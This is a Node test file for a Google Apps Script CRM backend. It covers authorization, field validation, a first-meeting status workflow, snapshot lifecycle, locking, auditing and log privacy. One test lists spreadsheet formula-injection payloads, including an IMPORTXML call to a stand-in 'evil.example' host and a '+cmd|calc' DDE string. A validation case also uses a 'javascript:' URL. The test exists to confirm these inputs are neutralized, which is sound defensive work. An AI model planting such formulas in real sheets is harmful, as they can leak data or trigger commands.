/**
 * Web CRM actions in the real Code.gs (crm_list / crm_get / crm_update /
 * crm_bulk_update / crm_create): authorization, ID-based safe writes, the
 * status workflow, single-source-of-truth RAW lifecycle, concurrency,
 * formula-injection safety, audit trail, and "no PII in logs".
 */
const test = require("node:test");
const assert = require("node:assert/strict");
const H = require("./helpers/gas-harness.cjs");

const MET = "İlk görüşme yapıldı";
const NOT = "İlk görüşme yapılmadı";
const OUTCOMES = ["İletişim Kuruldu", "Süreçte", "Olumsuz Sonuçlandı", "Olumlu Sonuçlandı"];
const PII = ["CRM-PII-Vorname", "CRM-PII-Notiz", "crm.pii@example.com", "+491700000001"];

function seed(env, n = 3) {
  const ids = [];
  for (let i = 1; i <= n; i++) {
    const r = H.post(env, H.leadBody({ payload: H.payload({ firstName: `Lead${i}`, lastName: `Person${i}`, email: `lead${i}@example.com` }) }, H.SID(i)));
    assert.ok(r.ok);
    ids.push(r.id);
    env.state.now = new Date(env.state.now.getTime() + 1000);
  }
  return ids;
}
const rowOf = (env, id) => {
  const crm = env.sheets.LEADS_CRM;
  return crm.rows.findIndex((r, i) => i > 0 && r[0] === id) + 1;
};
const get = (env, id) => H.crm(env, "crm_get", { id });
const update = (env, id, changes, extra = {}) => H.crm(env, "crm_update", { id, changes, ...extra });

test("every crm_* action rejects a wrong or missing secret and returns no data", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  seed(env, 1);
  for (const type of ["crm_list", "crm_get", "crm_update", "crm_bulk_update", "crm_create"]) {
    const bad = H.post(env, { secret: H.WRONG, type, id: "x", ids: ["x"], changes: { Notlar: "x" }, fields: {}, requestId: "abcdefgh" });
    assert.deepEqual(bad, { ok: false, error: "unauthorized" }, type);
    const none = H.post(env, { type });
    assert.deepEqual(none, { ok: false, error: "unauthorized" }, `${type} without secret`);
  }
});

test("crm_list: 23 columns, one entry per lead with a version, team + statuses, read-only (no sheet created)", () => {
  const env = H.fresh({ team: ["Ayşe", "Mehmet", "Ayşe"] });
  seed(env, 3);
  const before = JSON.stringify([env.sheets.LEADS_CRM.rows, env.sheets.LEADS_RAW.rows]);
  const r = H.crm(env, "crm_list");
  assert.ok(r.ok);
  assert.equal(r.columns.length, 23);
  assert.equal(r.columns[18], "Durum");
  assert.equal(r.total, 3);
  assert.equal(r.rows.length, 3);
  for (const row of r.rows) { assert.equal(row.v.length, 23); assert.match(row.ver, /^[0-9a-f]+$/); }
  assert.deepEqual(r.team, ["Ayşe", "Mehmet"], "distinct, trimmed TEAM names");
  assert.equal(r.statuses.length, 6);
  assert.equal(JSON.stringify([env.sheets.LEADS_CRM.rows, env.sheets.LEADS_RAW.rows]), before, "listing changes nothing");
  assert.equal(env.sheets.CRM_AUDIT, undefined, "reading never creates the audit sheet");
});

test("crm_list normalizes date-typed cells to ISO strings and skips blank lines", () => {
  const env = H.fresh();
  seed(env, 1);
  env.sheets.LEADS_CRM.rows[1][1] = new Date("2026-09-19T10:00:00Z"); // Sheets returns Date objects for date cells
  env.sheets.LEADS_CRM.rows.push(new Array(23).fill(""));
  const r = H.crm(env, "crm_list");
  assert.equal(r.total, 1);
  assert.equal(r.rows[0].v[1], "2026-09-19T10:00:00.000Z");
});

test("crm_list surfaces a header mismatch instead of guessing", () => {
  const env = H.fresh();
  seed(env, 1);
  env.sheets.LEADS_CRM.rows[0][4] = "E-mail";
  assert.deepEqual(H.crm(env, "crm_list"), { ok: false, error: "sheet_header_mismatch:LEADS_CRM" });
});

test("crm_get: snapshot info before the meeting comes from the lead's stored source facts", () => {
  const env = H.fresh();
  const r = H.post(env, H.leadBody({ payload: H.payload({ referralSource: "other", referralSourceOther: "Bir tanıdık" }) }, H.SID(5)));
  const g = get(env, r.id);
  assert.ok(g.ok);
  assert.equal(g.row.v[0], r.id);
  assert.deepEqual(g.snapshot, { exists: false, legacy: false, date: "", submissionId: H.SID(5), source: "rtg-website", sourceDetail: "Bir tanıdık" });
  assert.deepEqual(get(env, "nope"), { ok: false, error: "not_found" });
});

test("crm_get: after the first meeting the snapshot facts come from the RAW row; a legacy RAW row is flagged", () => {
  const env = H.fresh();
  const [id] = seed(env, 1);
  assert.ok(update(env, id, { Durum: MET }).ok);
  const g = get(env, id);
  assert.equal(g.snapshot.exists, true);
  assert.equal(g.snapshot.legacy, false);
  assert.equal(g.snapshot.date, "21.09.2026 10:30");
  assert.equal(g.snapshot.submissionId, H.SID(1));

  const legacyId = "RTG-L-20260919T100000-LEGACY";
  const raw = env.sheets.LEADS_RAW, crm = env.sheets.LEADS_CRM;
  const rr = env.RAW.map(() => ""); rr[H.col(raw, "ID")] = legacyId; rr[H.col(raw, "Submission ID")] = "legacy-sub"; raw.rows.push(rr);
  const cr = env.CRM.map(() => ""); cr[0] = legacyId; cr[H.col(crm, "Durum")] = NOT; crm.rows.push(cr);
  const lg = get(env, legacyId);
  assert.equal(lg.snapshot.exists, true);
  assert.equal(lg.snapshot.legacy, true, "old flow wrote RAW at submission time");
});

test("crm_update: by ID (row order irrelevant), returns the new row + version, only the asked cell changes", () => {
  const env = H.fresh({ team: ["Ayşe", "Mehmet"] });
  const ids = seed(env, 3);
  const crm = env.sheets.LEADS_CRM;
  [crm.rows[1], crm.rows[3]] = [crm.rows[3], crm.rows[1]]; // simulate re-sorting in the Sheet
  const before = H.crm(env, "crm_list").rows.find((x) => x.v[0] === ids[0]);
  const r = update(env, ids[0], { Sorumlu: "Ayşe" });
  assert.ok(r.ok);
  assert.equal(r.row.v[17], "Ayşe");
  assert.notEqual(r.row.ver, before.ver, "version changes with content");
  assert.equal(H.cell(crm, rowOf(env, ids[0]), "Sorumlu"), "Ayşe");
  for (const other of [ids[1], ids[2]]) assert.equal(H.cell(crm, rowOf(env, other), "Sorumlu"), "", "other leads untouched");
  assert.equal(r.row.v[2], before.v[2], "unrelated cells unchanged");
});

test("crm_update validation: unknown/read-only fields, types, lengths, enums, URLs and dates are rejected without writing", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  const [id] = seed(env, 1);
  const snapshot = () => JSON.stringify(env.sheets.LEADS_CRM.rows);
  const before = snapshot();
  const cases = [
    [{ Bogus: "x" }, "unknown_field"],
    [{ ID: "RTG-L-X" }, "field_not_editable"],
    [{ "Başvuru Tarihi": "2020-01-01" }, "field_not_editable"],
    [{ Notlar: 123 }, "invalid_value"],
    [{ Notlar: "x".repeat(10001) }, "value_too_long"],
    [{ "Mentor ID": "x".repeat(600) }, "value_too_long"],
    [{ Durum: "Uydurma" }, "invalid_status"],
    [{ Sorumlu: "Yabancı" }, "invalid_responsible"],
    [{ "Tercih Edilen İletişim": "fax" }, "invalid_value"],
    [{ "Drive Folder": "javascript:alert(1)" }, "invalid_url"],
    [{ "Drive Folder": "http://insecure.example.com/x" }, "invalid_url"],
    [{ Email: "not-an-email" }, "invalid_email"],
    [{ "Mentor ID": "bad;id" }, "invalid_mentor_id"],
    [{ "İlk Görüşme Tarihi": "yarın" }, "invalid_date"],
    [{ Ad: "" }, "invalid_value"],
    [{}, "no_changes"],
  ];
  for (const [changes, error] of cases) {
    const r = update(env, id, changes);
    assert.equal(r.ok, false, JSON.stringify(changes));
    assert.equal(r.error, error, JSON.stringify(changes));
  }
  assert.equal(snapshot(), before, "no rejected request wrote anything");
  assert.equal(update(env, "missing-id", { Notlar: "x" }).error, "not_found");
  assert.ok(update(env, id, { "Drive Folder": "https://drive.google.com/drive/folders/abc", "Mentor ID": "M-042" }).ok);
});

test("crm_update: control characters stripped; Sheets formula injection is neutralized", () => {
  const env = H.fresh();
  const [id] = seed(env, 1);
  const crm = env.sheets.LEADS_CRM;
  assert.ok(update(env, id, { Notlar: "line1\r\nline2\u0000\u0007 end" }).ok);
  assert.equal(H.cell(crm, 2, "Notlar"), "line1\nline2 end");
  for (const evil of ["=IMPORTXML(\"http://evil.example\",\"//a\")", "+cmd|calc", "-2+3+HYPERLINK(\"x\")", "@SUM(1)"]) {
    assert.ok(update(env, id, { Notlar: evil }).ok);
    assert.equal(H.cell(crm, 2, "Notlar"), "'" + evil, `neutralized: ${evil}`);
  }
  assert.ok(update(env, id, { Telefon: "+90 555 123 45 67" }).ok);
  assert.equal(H.cell(crm, 2, "Telefon"), "+90 555 123 45 67", "phone-like values are not mangled");
});

// ---------------------------------------------------------------- workflow
test("WORKFLOW: 'yapılmadı' -> outcome is rejected (each of the four) and writes nothing, no RAW", () => {
  for (const outcome of OUTCOMES) {
    const env = H.fresh();
    const [id] = seed(env, 1);
    const before = JSON.stringify(env.sheets.LEADS_CRM.rows);
    const r = update(env, id, { Durum: outcome });
    assert.deepEqual([r.ok, r.error], [false, "first_meeting_required"], outcome);
    assert.equal(JSON.stringify(env.sheets.LEADS_CRM.rows), before);
    assert.equal(H.dataRows(env.sheets.LEADS_RAW).length, 0);
  }
});

test("WORKFLOW: a manual date in the same request cannot bypass the first-meeting rule", () => {
  const env = H.fresh();
  const [id] = seed(env, 1);
  const r = update(env, id, { Durum: "Süreçte", "İlk Görüşme Tarihi": "01.01.2026 10:00" });
  assert.equal(r.error, "first_meeting_required");
  assert.equal(H.dataRows(env.sheets.LEADS_RAW).length, 0);
});

test("WORKFLOW: 'yapılmadı' -> 'yapıldı' stamps the date and creates exactly one RAW snapshot via the shared lifecycle", () => {
  const env = H.fresh();
  const [id] = seed(env, 2);
  const r = update(env, id, { Durum: MET });
  assert.ok(r.ok);
  assert.deepEqual(r.lifecycle, { dateStamped: true, snapshot: "created", error: "" });
  const crm = env.sheets.LEADS_CRM, raw = env.sheets.LEADS_RAW;
  assert.equal(H.cell(crm, rowOf(env, id), "Durum"), MET);
  assert.equal(H.cell(crm, rowOf(env, id), "İlk Görüşme Tarihi"), "21.09.2026 10:30");
  assert.equal(H.dataRows(raw).length, 1, "RAW +1, only for this lead");
  assert.equal(raw.rows[1].length, 22);
  assert.equal(H.cell(raw, 2, "ID"), id);
  assert.equal(H.cell(raw, 2, "Profil Snapshot Tarihi"), "21.09.2026 10:30");
  assert.equal(H.cell(raw, 2, "Submission ID"), H.SID(1));
  assert.equal(H.cell(raw, 2, "Source"), "rtg-website");
});

test("WORKFLOW: repeating the transition (or re-saving 'yapıldı') never adds a second RAW row or re-snapshots", () => {
  const env = H.fresh();
  const [id] = seed(env, 1);
  update(env, id, { Durum: MET });
  const snap = JSON.stringify(env.sheets.LEADS_RAW.rows);
  const again = update(env, id, { Durum: MET });
  assert.ok(again.ok);
  assert.deepEqual(again.lifecycle, { dateStamped: false, snapshot: "exists", error: "" });
  update(env, id, { Durum: NOT }); update(env, id, { Durum: MET });
  assert.equal(H.dataRows(env.sheets.LEADS_RAW).length, 1);
  assert.equal(JSON.stringify(env.sheets.LEADS_RAW.rows), snap);
});

test("WORKFLOW: profile edits made in the same request are inside the snapshot; management fields are not", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  const [id] = seed(env, 1);
  assert.ok(update(env, id, { Ad: "Düzeltilmiş", "Almanca Seviyesi": "c1", Sorumlu: "Ayşe", "Mentor ID": "M-1", Durum: MET }).ok);
  const raw = env.sheets.LEADS_RAW;
  assert.equal(H.cell(raw, 2, "Ad"), "Düzeltilmiş");
  assert.equal(H.cell(raw, 2, "Almanca Seviyesi"), "c1");
  const flat = JSON.stringify(raw.rows[1]);
  assert.ok(!flat.includes("Ayşe") && !flat.includes("M-1"), "Sorumlu / Mentor ID are never copied to RAW");
});

test("WORKFLOW: after the meeting all outcomes are allowed; the date cannot be cleared while past 'yapılmadı'", () => {
  const env = H.fresh();
  const [id] = seed(env, 1);
  update(env, id, { Durum: MET });
  for (const o of OUTCOMES) assert.ok(update(env, id, { Durum: o }).ok, o);
  assert.equal(update(env, id, { "İlk Görüşme Tarihi": "" }).error, "first_meeting_date_required");
  assert.ok(update(env, id, { "İlk Görüşme Tarihi": "22.09.2026 09:15" }).ok);
});

test("RAW LIFECYCLE: CRM edits never touch RAW; only the lifecycle ever writes it, and only once", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  const [id] = seed(env, 1);
  const raw = env.sheets.LEADS_RAW;
  const rawBefore = JSON.stringify(raw.rows);
  update(env, id, { Sorumlu: "Ayşe" }); update(env, id, { Notlar: "Bir not" }); update(env, id, { "Mentor ID": "M-7" });
  assert.equal(JSON.stringify(raw.rows), rawBefore, "non-Durum edits: RAW untouched");
  update(env, id, { Durum: MET });
  const snap = JSON.stringify(raw.rows);
  update(env, id, { "Almanca Seviyesi": "c2", Notlar: "Sonradan" });
  assert.equal(JSON.stringify(raw.rows), snap, "post-snapshot CRM edits: RAW untouched");
  raw.rows[1][H.col(raw, "Almanca Seviyesi")] = "a1"; // someone edits RAW by hand
  assert.notEqual(H.cell(env.sheets.LEADS_CRM, 2, "Almanca Seviyesi"), "a1", "RAW edit does not reach CRM");
  assert.equal(raw.deleteRowCalls + raw.clearCalls + raw.deleteColumnsCalls, 0);
});

test("RAW LIFECYCLE: a failing RAW write does not fail the status change; retrying completes the snapshot", () => {
  const env = H.fresh();
  const [id] = seed(env, 1);
  env.sheets.LEADS_RAW.failAppend = true;
  const r = update(env, id, { Durum: MET });
  assert.ok(r.ok, "the CRM update itself succeeded");
  assert.equal(r.lifecycle.snapshot, "failed");
  assert.equal(H.cell(env.sheets.LEADS_CRM, 2, "Durum"), MET);
  assert.equal(H.dataRows(env.sheets.LEADS_RAW).length, 0);
  env.sheets.LEADS_RAW.failAppend = false;
  assert.equal(update(env, id, { Durum: MET }).lifecycle.snapshot, "created");
  assert.equal(H.dataRows(env.sheets.LEADS_RAW).length, 1);
});

test("RAW LIFECYCLE: legacy RAW rows are preserved — 'yapıldı' on such a lead never rewrites them", () => {
  const env = H.fresh();
  const legacyId = "RTG-L-20260919T100000-LEGACY";
  const raw = env.sheets.LEADS_RAW, crm = env.sheets.LEADS_CRM;
  const rr = env.RAW.map(() => ""); rr[H.col(raw, "ID")] = legacyId; rr[H.col(raw, "Ad")] = "LEGACY-RAW-AD"; raw.rows.push(rr);
  const cr = env.CRM.map(() => ""); cr[0] = legacyId; cr[H.col(crm, "Ad")] = "CRM-AD"; cr[H.col(crm, "Durum")] = NOT; crm.rows.push(cr);
  const rawBefore = JSON.stringify(raw.rows);
  const r = update(env, legacyId, { Durum: MET });
  assert.ok(r.ok);
  assert.equal(r.lifecycle.snapshot, "exists");
  assert.equal(JSON.stringify(raw.rows), rawBefore);
});

// ------------------------------------------------------------- concurrency
test("CONCURRENCY: a stale expectedVersion is rejected with the current row and writes nothing", () => {
  const env = H.fresh({ team: ["Ayşe", "Mehmet"] });
  const [id] = seed(env, 1);
  const v1 = H.crm(env, "crm_list").rows[0].ver;
  const a = update(env, id, { Sorumlu: "Ayşe" }, { expectedVersion: v1 });
  assert.ok(a.ok);
  const b = update(env, id, { Sorumlu: "Mehmet" }, { expectedVersion: v1 }); // second editor still holds v1
  assert.equal(b.ok, false);
  assert.equal(b.error, "conflict");
  assert.equal(b.row.v[17], "Ayşe", "conflict response carries the current row");
  assert.equal(H.cell(env.sheets.LEADS_CRM, 2, "Sorumlu"), "Ayşe", "the losing write did not land");
  assert.ok(update(env, id, { Sorumlu: "Mehmet" }, { expectedVersion: b.row.ver }).ok, "retry with the fresh version succeeds");
});

test("CONCURRENCY: writes take the script lock; a busy lock fails safe without writing", () => {
  const env = H.fresh();
  const [id] = seed(env, 1);
  const before = env.state.locksTaken;
  update(env, id, { Notlar: "a" });
  assert.equal(env.state.locksTaken, before + 1);
  env.state.lockBusy = true;
  const rows = JSON.stringify(env.sheets.LEADS_CRM.rows);
  for (const r of [update(env, id, { Notlar: "b" }), H.crm(env, "crm_bulk_update", { ids: [id], changes: { "Mentor ID": "M-1" } }), H.crm(env, "crm_create", { fields: { Ad: "A", Soyad: "B", Telefon: "+491" }, requestId: "req-busy-0001" })]) {
    assert.deepEqual([r.ok, r.error], [false, "busy"]);
  }
  assert.equal(JSON.stringify(env.sheets.LEADS_CRM.rows), rows);
  assert.ok(H.crm(env, "crm_list").ok, "reads do not need the lock");
});

// -------------------------------------------------------------------- bulk
test("BULK: assign Sorumlu / Mentor ID to many leads by ID; per-row results", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  const ids = seed(env, 4);
  const r = H.crm(env, "crm_bulk_update", { ids: ids.slice(0, 3), changes: { Sorumlu: "Ayşe", "Mentor ID": "M-9" } });
  assert.ok(r.ok);
  assert.equal(r.updated, 3); assert.equal(r.failed, 0);
  for (const id of ids.slice(0, 3)) { assert.equal(H.cell(env.sheets.LEADS_CRM, rowOf(env, id), "Sorumlu"), "Ayşe"); assert.equal(H.cell(env.sheets.LEADS_CRM, rowOf(env, id), "Mentor ID"), "M-9"); }
  assert.equal(H.cell(env.sheets.LEADS_CRM, rowOf(env, ids[3]), "Sorumlu"), "", "unselected lead untouched");
});

test("BULK: status 'yapıldı' runs the lifecycle per lead (one RAW row each, never duplicated)", () => {
  const env = H.fresh();
  const ids = seed(env, 3);
  const r = H.crm(env, "crm_bulk_update", { ids, changes: { Durum: MET } });
  assert.equal(r.updated, 3);
  assert.equal(H.dataRows(env.sheets.LEADS_RAW).length, 3);
  assert.deepEqual(H.dataRows(env.sheets.LEADS_RAW).map((x) => x[0]).sort(), [...ids].sort());
  H.crm(env, "crm_bulk_update", { ids, changes: { Durum: MET } });
  assert.equal(H.dataRows(env.sheets.LEADS_RAW).length, 3, "re-running the bulk transition adds nothing");
});

test("BULK: the first-meeting rule applies per row — mixed selection partially succeeds", () => {
  const env = H.fresh();
  const ids = seed(env, 3);
  update(env, ids[0], { Durum: MET });
  const r = H.crm(env, "crm_bulk_update", { ids, changes: { Durum: "Süreçte" } });
  assert.equal(r.updated, 1); assert.equal(r.failed, 2);
  assert.equal(r.results.find((x) => x.id === ids[0]).ok, true);
  assert.equal(r.results.find((x) => x.id === ids[1]).error, "first_meeting_required");
  assert.equal(H.cell(env.sheets.LEADS_CRM, rowOf(env, ids[1]), "Durum"), NOT);
});

test("BULK: only Sorumlu / Durum / Mentor ID; limits; duplicates and bad ids are handled", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  const [id] = seed(env, 1);
  assert.equal(H.crm(env, "crm_bulk_update", { ids: [id], changes: { Ad: "Hack" } }).error, "bulk_field_not_allowed");
  assert.equal(H.crm(env, "crm_bulk_update", { ids: [id], changes: { Notlar: "x" } }).error, "bulk_field_not_allowed");
  assert.equal(H.crm(env, "crm_bulk_update", { ids: [], changes: { Sorumlu: "Ayşe" } }).error, "missing_ids");
  assert.equal(H.crm(env, "crm_bulk_update", { ids: Array.from({ length: 201 }, (_, i) => `id-${i}`), changes: { Sorumlu: "Ayşe" } }).error, "too_many_ids");
  assert.equal(H.crm(env, "crm_bulk_update", { ids: [id], changes: {} }).error, "no_changes");
  const r = H.crm(env, "crm_bulk_update", { ids: [id, id, "ghost"], changes: { Sorumlu: "Ayşe" } });
  assert.equal(r.updated, 1);
  assert.deepEqual(r.results.map((x) => x.error || "ok"), ["ok", "invalid_id", "not_found"]);
});

// ----------------------------------------------------------- no destruction
test("SAFETY: there is no delete action, and no CRM action ever deletes/clears rows or columns", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  const ids = seed(env, 3);
  for (const type of ["crm_delete", "crm_remove", "crm_clear", "crm_truncate"]) assert.equal(H.crm(env, type, { id: ids[0] }).error, "unknown_type", type);
  update(env, ids[0], { Durum: MET }); update(env, ids[1], { Sorumlu: "Ayşe" });
  H.crm(env, "crm_bulk_update", { ids, changes: { "Mentor ID": "M-1" } });
  H.crm(env, "crm_create", { fields: { Ad: "A", Soyad: "B", Telefon: "+491" }, requestId: "req-safety-01" });
  for (const sh of Object.values(env.sheets)) { assert.equal(sh.deleteRowCalls, 0, sh.name); assert.equal(sh.clearCalls, 0, sh.name); assert.equal(sh.deleteColumnsCalls, 0, sh.name); assert.equal(sh.setValuesCalls, 0, sh.name); }
  assert.equal(H.dataRows(env.sheets.LEADS_CRM).length, 4);
  assert.deepEqual(env.sheets.LEADS_CRM.rows[0], env.CRM, "CRM header untouched");
  assert.deepEqual(env.sheets.LEADS_RAW.rows[0], env.RAW, "RAW header untouched");
});

// ------------------------------------------------------------- manual lead
test("MANUAL LEAD: validated create -> CRM only, source 'manual', default status, idempotent by requestId", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  assert.equal(H.crm(env, "crm_create", { fields: { Soyad: "B", Telefon: "+491" }, requestId: "req-manual-01" }).error, "missing_name");
  assert.equal(H.crm(env, "crm_create", { fields: { Ad: "A", Soyad: "B" }, requestId: "req-manual-01" }).error, "missing_contact");
  assert.equal(H.crm(env, "crm_create", { fields: { Ad: "A", Soyad: "B", Telefon: "+491" }, requestId: "short" }).error, "invalid_request_id");
  assert.equal(H.crm(env, "crm_create", { fields: { Ad: "A", Soyad: "B", Telefon: "+491", Durum: MET }, requestId: "req-manual-01" }).error, "unknown_field", "status can't be forced at creation");
  assert.equal(H.crm(env, "crm_create", { fields: { Ad: "A", Soyad: "B", Email: "bad" }, requestId: "req-manual-01" }).error, "invalid_email");
  assert.equal(H.dataRows(env.sheets.LEADS_CRM).length, 0, "invalid requests wrote nothing");

  const fields = { Ad: "Manuel", Soyad: "Kişi", Telefon: "+90 555 000 00 00", Sorumlu: "Ayşe", Notlar: "İlk temas WhatsApp'tan" };
  const a = H.crm(env, "crm_create", { fields, requestId: "req-manual-01" });
  assert.ok(a.ok && a.existing === false && /^RTG-L-/.test(a.id));
  const crm = env.sheets.LEADS_CRM;
  assert.equal(crm.rows[1].length, 23);
  assert.equal(H.cell(crm, 2, "Durum"), NOT);
  assert.equal(H.cell(crm, 2, "Bizi Nereden Duydunuz"), "Manuel giriş");
  assert.equal(H.cell(crm, 2, "Sorumlu"), "Ayşe");
  assert.equal(H.dataRows(env.sheets.LEADS_RAW).length, 0, "creation never touches RAW");
  const again = H.crm(env, "crm_create", { fields, requestId: "req-manual-01" });
  assert.deepEqual([again.ok, again.existing, again.id], [true, true, a.id], "double submit is idempotent");
  assert.equal(H.dataRows(crm).length, 1);
  assert.equal(get(env, a.id).snapshot.source, "manual");
});

test("MANUAL LEAD: its first meeting creates the RAW snapshot with source 'manual'; formulas are neutralized", () => {
  const env = H.fresh();
  const a = H.crm(env, "crm_create", { fields: { Ad: "=HYPERLINK(\"x\")", Soyad: "Kişi", Email: "manuel@example.com" }, requestId: "req-manual-02" });
  assert.equal(H.cell(env.sheets.LEADS_CRM, 2, "Ad"), "'=HYPERLINK(\"x\")");
  update(env, a.id, { Durum: MET });
  const raw = env.sheets.LEADS_RAW;
  assert.equal(H.dataRows(raw).length, 1);
  assert.equal(H.cell(raw, 2, "Source"), "manual");
  assert.equal(H.cell(raw, 2, "Submission ID"), "manual:req-manual-02");
});

// ------------------------------------------------------------------- audit
test("AUDIT: CRM_AUDIT is created lazily, records who/what — and never stores personal-data values", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  const [id] = seed(env, 1);
  assert.equal(env.sheets.CRM_AUDIT, undefined);
  update(env, id, { Sorumlu: "Ayşe", Notlar: "CRM-PII-Notiz", Ad: "CRM-PII-Vorname", Email: "crm.pii@example.com", Telefon: "+491700000001" }, { actor: "Ayşe K." });
  update(env, id, { Durum: MET }, { actor: "Ayşe K." });
  const audit = env.sheets.CRM_AUDIT;
  assert.deepEqual(H.plain(audit.rows[0]), ["Zaman", "ID", "Eylem", "Alan", "Eski Değer", "Yeni Değer", "Kullanıcı"]);
  const rows = audit.rows.slice(1);
  const durum = rows.find((r) => r[3] === "Durum");
  assert.deepEqual([durum[1], durum[2], durum[4], durum[5], durum[6]], [id, "update", NOT, MET, "Ayşe K."]);
  assert.ok(rows.some((r) => r[2] === "lifecycle" && r[3] === "İlk Görüşme Tarihi"));
  assert.ok(rows.some((r) => r[2] === "lifecycle" && r[3] === "LEADS_RAW" && r[5] === "snapshot oluşturuldu"));
  assert.equal(rows.find((r) => r[3] === "Sorumlu")[5], "Ayşe", "workflow fields keep their values");
  for (const masked of ["Notlar", "Ad", "Email", "Telefon"]) assert.deepEqual([rows.find((r) => r[3] === masked)[4], rows.find((r) => r[3] === masked)[5]], ["(gizli)", "(gizli)"], masked);
  const flat = JSON.stringify(audit.rows);
  for (const p of PII) assert.ok(!flat.includes(p), `audit leaks ${p}`);
});

test("AUDIT: crm_get returns the lead's recent activity; an audit failure never blocks the write", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  const [id] = seed(env, 1);
  update(env, id, { Sorumlu: "Ayşe" });
  const g = get(env, id);
  assert.ok(g.activity.length >= 1);
  assert.equal(g.activity[0].field, "Sorumlu");

  const env2 = H.fresh();
  const [id2] = seed(env2, 1);
  env2.ss.insertSheet = () => { throw new Error("cannot create sheets"); };
  const r = update(env2, id2, { Notlar: "yine de kaydedilir" });
  assert.ok(r.ok, "write succeeded although the audit sheet could not be created");
  assert.equal(H.cell(env2.sheets.LEADS_CRM, 2, "Notlar"), "yine de kaydedilir");
  assert.ok(env2.logs.some((l) => l.includes("audit log write failed")));
});

// --------------------------------------------------------------------- PII
test("PRIVACY: Apps Script logs for CRM actions contain no names, e-mails, phones, notes or the secret", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  const r = H.post(env, H.leadBody({ payload: H.payload({ firstName: "CRM-PII-Vorname", email: "crm.pii@example.com", phone: "+491700000001" }) }, H.SID(1)));
  H.crm(env, "crm_list");
  get(env, r.id);
  update(env, r.id, { Notlar: "CRM-PII-Notiz", Sorumlu: "Ayşe" });
  update(env, r.id, { Durum: MET }, { actor: "Ayşe K." });
  H.crm(env, "crm_bulk_update", { ids: [r.id], changes: { "Mentor ID": "M-1" } });
  H.crm(env, "crm_create", { fields: { Ad: "CRM-PII-Vorname", Soyad: "X", Email: "crm.pii@example.com" }, requestId: "req-privacy-01" });
  update(env, r.id, { Notlar: "x".repeat(20000) }); // rejected request
  H.post(env, { secret: H.WRONG, type: "crm_list" });
  const logs = env.logs.join("\n");
  for (const p of [...PII, H.SECRET, H.WRONG]) assert.ok(!logs.includes(p), `log leaks ${p}`);
  assert.ok(/\[RTG crm\]/.test(logs), "actions are still logged (by name / id / field names)");
});

test("public form flow is unchanged after CRM traffic (regression guard)", () => {
  const env = H.fresh({ team: ["Ayşe"] });
  const [id] = seed(env, 1);
  update(env, id, { Durum: MET });
  const a = H.post(env, H.leadBody({}, H.SID(9)));
  assert.ok(a.ok);
  assert.equal(H.dataRows(env.sheets.LEADS_CRM).length, 2, "CRM +1");
  assert.equal(H.dataRows(env.sheets.LEADS_RAW).length, 1, "RAW unchanged by the new submission");
  assert.equal(H.post(env, H.leadBody({}, H.SID(9))).id, a.id, "idempotent");
});
